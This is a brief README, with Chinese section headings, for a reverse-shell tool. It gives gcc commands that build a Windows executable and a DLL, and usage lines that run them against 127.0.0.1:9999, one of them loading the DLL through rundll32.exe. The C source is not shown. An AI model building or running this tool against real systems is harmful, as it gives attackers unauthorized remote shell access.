# reverse_shell

## 编译

gcc.exe client.c -o client.exe -lws2_32

gcc.exe --shared client_rundll32.c -o client.dll -lws2_32

## 使用

client.exe 127.0.0.1 9999

rundll32.exe client.dll, reverse 127.0.0.1:9999
